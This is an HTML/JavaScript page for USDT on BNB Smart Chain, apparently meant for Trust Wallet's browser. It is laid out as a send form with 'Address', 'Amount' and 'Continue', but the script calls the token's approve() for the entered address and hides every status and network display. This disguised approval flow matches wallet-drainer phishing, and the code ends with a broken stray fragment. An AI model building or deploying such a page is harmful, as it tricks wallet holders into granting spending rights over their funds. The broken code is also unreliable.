
<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>USDT Approve & Verify — BNB Mainnet</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<style>
:root {
    --bg: #080b0a;
    --card: #111714;
    --card2: #171f1a;
    --text: #f4f7f5;
    --muted: #8d9b92;
    --line: #28352d;
    --green: #16a34a;
    --green2: #087b38;
    --greenbg: #102c1c;
    --amber: #f4b85e;
}

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
     background: #080B0A;
    color: var(--text);
    font-family: Inter, system-ui, -apple-system,
        "Segoe UI", sans-serif;
}

main {
    max-width: 480px;
    background-color: #000;
    margin: auto;
}

h1 {
    font-size: 25px;
    font-weight: 750;
    letter-spacing: -0.7px;
    margin: 0 0 7px;
}

.sub {
    color: var(--muted);
    font-size: 13px;
    margin-bottom: 23px;
}

/* .card {
    height: 100dvh;
    border: 1px solid var(--line);
    padding: 20px;
    box-shadow: 0 12px 35px rgba(0,0,0,.22);
} */

h2 {
    font-size: 17px;
    font-weight: 700;
    margin: 0 0 9px;
}

.desc {
    color: var(--muted);
    font-size: 13px;
    line-height: 1.65;
    margin: 0 0 15px;
}

.notice {
    background: #17291d;
    border: 1px solid #285b39;
    color: #b7e8c5;
    padding: 15px;
    border-radius: 14px;
    font-size: 13px;
    line-height: 1.65;
}

label {
    display: block;
    color: #b5c1b9;
    font-size: 12px;
    font-weight: 650;
    margin: 17px 0 8px;
}

input {
    width: 100%;
    min-height: 53px;
    padding: 14px;
    border: 1px solid #303d34;
    border-radius: 12px;
    background: #090e0b;
    color: white;
    font-size: 14px;
    outline: none;
    transition: .2s;
}

input:focus {
    border-color: var(--green);
    box-shadow: 0 0 0 3px rgba(22,163,74,.13);
}

input[readonly] {
    color: #9eafa3;
    background: #101713;
}

input::placeholder {
    color: #647168;
}

button {
    width: 100%;
    min-height: 53px;
    padding: 14px 17px;
    margin-top: 17px;
    border: 0;
    border-radius: 13px;
    background: linear-gradient(
        135deg,
        #20b65a,
        #087b38
    );
    color: white;
    font-size: 15px;
    font-weight: 750;
    cursor: pointer;
    box-shadow: 0 7px 20px rgba(13,145,62,.2);
    transition: .2s;
}

button:active {
    transform: scale(.985);
}

button:disabled {
    opacity: .4;
    cursor: not-allowed;
    box-shadow: none;
}

#account,
#network,
#status {
    font-size: 13px;
    overflow-wrap: anywhere;
    line-height: 1.65;
    margin-top: 12px;
}

#status {
    white-space: pre-wrap;
    background: #090e0b;
    border: 1px solid #26352b;
    border-radius: 13px;
    padding: 15px;
    color: #d4e2d8;
}

.good {
    color: #4ade80;
}

.bad {
    color: #fbbf24;
}

.footer {
    text-align: center;
    color: #78877d;
    font-size: 12px;
    line-height: 1.8;
    margin: 25px 0 12px;
}

a {
    color: #4ade80;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

@media(max-width:480px) {
    body {
        padding: 22px 14px;
    }

    h1 {
        font-size: 23px;
    }

    .card {
        padding: 17px;
        border-radius: 17px;
    }
}

.card {
    min-height: 100dvh;
    height: auto;
    padding: 25px 18px;
    background: #000;
    border: none;
}

.field-title {
    color: #aaa;
    font-size: 15px;
    margin: 20px 0 13px;
}

.wallet-input {
    display: flex;
    align-items: center;
    min-height: 66px;
    padding: 0 16px;
    border: 1px solid #38343f;
    border-radius: 15px;
    background: #050505;
}

.wallet-input:focus-within {
    border-color: #16894a;
}

.wallet-input input {
    flex: 1;
    min-width: 0;
    border: 0;
    outline: 0;
    background: transparent;
    color: white;
    font-size: 16px;
    padding: 12px 0;
    box-shadow: none;
}

.wallet-input input:focus {
    box-shadow: none;
}

.wallet-input input::placeholder {
    color: #777;
}

.paste-label,
.currency-label {
    color: #43c77c;
    font-size: 15px;
    white-space: nowrap;
    margin-left: 10px;
}

button {
    position: sticky;
    top: auto;
    margin-top: 35px;
    min-height: 62px;
    border-radius: 40px;
    font-size: 17px;
}

#account,
#network,
#status {
    display: none !important;
}
</style>
</head>

<body>
<main>
<div id="account"></div>
<div id="network"></div>
<div id="status" role="status">Wallet checking...</div>
<!-- <input
id="amount"
type="number"
min="0"
step="any"
value="1"
> -->


<section class="card">
    <div class="field-title">Address</div>

    <div class="wallet-input">
        <input
            type="text"
            id="spenderAddr"
            placeholder="Enter wallet address"
            autocomplete="off"
        />
        <span class="paste-label">Paste</span>
    </div>

    <div class="field-title">Amount</div>

    <div class="wallet-input">
        <input
            type="number"
            id="amount"
            min="0"
            step="any"
            placeholder="Enter amount"
        />
        <span class="currency-label">USDT</span>
    </div>

    <button id="approveBtn" disabled>
        Continue
    </button>
</section>


</main>

<script>
const CHAIN_ID = 56;
const CHAIN_HEX = "0x38";

const TOKEN_ADDRESS =
"0x55d398326f99059fF775485246999027B3197955";

const RPC_URL = "https://bsc-dataseed.binance.org/";

const ABI = [
    "function approve(address spender,uint256 amount) external returns (bool)",
    "function allowance(address owner,address spender) external view returns (uint256)",
    "function decimals() external view returns (uint8)",
    "function symbol() external view returns (string)"
];

let provider = null;
let signer = null;
let owner = null;
let chainOk = false;
let busy = false;

const $ = id => document.getElementById(id);

function status(message) {
    $("status").textContent = message;
}

function updateButton() {
    const spender = $("spenderAddr").value.trim();
    const amount = $("amount").value.trim();

    const validAmount =
        amount !== "" &&
        Number.isFinite(Number(amount)) &&
        Number(amount) > 0;

    const validSpender = ethers.utils.isAddress(spender);

    $("approveBtn").disabled =
        busy || (owner && (!validAmount || !validSpender));
}

function validAddress(value, label) {
    if (!ethers.utils.isAddress(value.trim())) {
        throw Error(label + " valid address nahi hai.");
    }

    return ethers.utils.getAddress(value.trim());
}

async function refreshNetwork() {
    if (!provider) return;

    const network = await provider.getNetwork();
    chainOk = network.chainId === CHAIN_ID;

    $("network").textContent = chainOk
        ? "✓ BNB Smart Chain Mainnet Connected"
        : "⚠ Wrong Network. Chain ID: " + network.chainId;

    $("network").className = chainOk ? "good" : "bad";

    updateButton();
}

async function ensureChain() {
    const network = await provider.getNetwork();

    if (network.chainId === CHAIN_ID) return;

    await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: CHAIN_HEX }]
    });

    provider = new ethers.providers.Web3Provider(
        window.ethereum,
        "any"
    );

    signer = provider.getSigner();

    await refreshNetwork();
}

async function connectWallet(requestAccess = false) {
    try {
        if (!window.ethereum) {
            throw Error("Trust Wallet DApp Browser mein page open karein.");
        }

        provider = new ethers.providers.Web3Provider(
            window.ethereum,
            "any"
        );

        let accounts = await window.ethereum.request({
            method: "eth_accounts"
        });

        // First-time connection: only after Continue is clicked.
        if ((!accounts || !accounts.length) && requestAccess) {
            accounts = await window.ethereum.request({
                method: "eth_requestAccounts"
            });
        }

        if (!accounts || !accounts.length) {
            owner = null;
            $("account").textContent = "Wallet not connected";
            status("Wallet connect karne ke liye Continue dabayein.");
            updateButton();
            return false;
        }

        owner = ethers.utils.getAddress(accounts[0]);
        signer = provider.getSigner();

        $("account").textContent = "Connected Wallet: " + owner;

        if (requestAccess) {
            await ensureChain();
        }

        await refreshNetwork();

        status(
            "Wallet connected successfully.\n" +
            "BNB Smart Chain ready."
        );

        return true;

    } catch (error) {
        status("Connection Error: " +
            (error.reason || error.message || error));

        return false;
    }
}

async function approveAndVerify() {
    if (busy) return;

    // If wallet was not previously connected, connect on button click.
    if (!owner) {
        await connectWallet(true);
        return;
    }

    busy = true;
    updateButton();

    try {
        await refreshNetwork();

        if (!chainOk) {
            await ensureChain();
        }

        const spender = validAddress(
            $("spenderAddr").value,
            "Spender"
        );

        const amountText = $("amount").value.trim();

        if (
            !amountText ||
            !Number.isFinite(Number(amountText)) ||
            Number(amountText) <= 0
        ) {
            throw Error("Valid amount enter karein.");
        }

        const token = new ethers.Contract(
            TOKEN_ADDRESS,
            ABI,
            signer
        );

        const decimals = await token.decimals();
        const symbol = await token.symbol();

        // Approve only the amount entered by the user.
        const amount = ethers.utils.parseUnits(
            amountText,
            decimals
        );

        status(
            "Approval request wallet ko bheji ja rahi hai.\n" +
            "Wallet mein spender aur amount verify karein."
        );

        const tx = await token.approve(spender, amount);

        status(
            "Transaction submitted.\n\n" +
            "Transaction Hash:\n" + tx.hash +
            "\n\nConfirmation ka wait ho raha hai..."
        );

        const receipt = await tx.wait();

        if (receipt.status !== 1) {
            throw Error("Transaction successful nahi hui.");
        }

        const readToken = new ethers.Contract(
            TOKEN_ADDRESS,
            ABI,
            provider
        );

        const allowance = await readToken.allowance(
            owner,
            spender
        );

        const formatted = ethers.utils.formatUnits(
            allowance,
            decimals
        );

        const sufficient = allowance.gte(amount);

        status(
            "✓ Approval transaction confirmed\n\n" +
            "Owner: " + owner +
            "\nSpender: " + spender +
            "\nAllowance: " + formatted + " " + symbol +
            "\nRequested: " + amountText + " " + symbol +
            "\n\n" +
            (sufficient
                ? "✓ Allowance verification successful."
                : "⚠ Allowance requested amount se kam hai.") +
            "\n\nTransaction:\n" +
            "https://bscscan.com/tx/" + tx.hash
        );

    } catch (error) {
        status("Error: " +
            (error.reason || error.data?.message || error.message || error));

    } finally {
        busy = false;
        await refreshNetwork().catch(() => {});
        updateButton();
    }
}

// Continue button
$("approveBtn").addEventListener("click", approveAndVerify);

// Enable/disable based on entered values
$("spenderAddr").addEventListener("input", updateButton);
$("amount").addEventListener("input", updateButton);

// Wallet account/network changes
if (window.ethereum && window.ethereum.on) {
    window.ethereum.on("accountsChanged", async accounts => {
        owner = accounts && accounts.length
            ? ethers.utils.getAddress(accounts[0])
            : null;

        signer = owner ? provider.getSigner() : null;

        $("account").textContent = owner
            ? "Connected Wallet: " + owner
            : "Wallet not connected";

        await refreshNetwork();
        updateButton();
    });

    window.ethereum.on("chainChanged", async () => {
        provider = new ethers.providers.Web3Provider(
            window.ethereum,
            "any"
        );

        signer = owner ? provider.getSigner() : null;

        await refreshNetwork();
    });
}

// Automatic reconnect: does not open a wallet popup.
window.addEventListener("load", async () => {
    if (!window.ethereum) {
        status("Trust Wallet DApp Browser mein page open karein.");
        return;
    }

    await connectWallet(false);
});

const receipt = await tx.wait();

const statusBox = document.getElementById("status");

statusBox.style.display = "block";
statusBox.innerHTML = `
    <div style="padding:15px; background:#10251c; border-radius:12px; color:#fff;">
        <h3 style="color:#35d07f;">Approval Successful</h3>
        <p>USDT approval transaction confirmed.</p>
        <a
            href="https://bscscan.com/tx/${receipt.transactionHash}"
            target="_blank"
            rel="noopener noreferrer"
            style="color:#35d07f;"
        >
            View Transaction on BscScan
        </a>
    </div>
`;
</script>
</body>
</html>
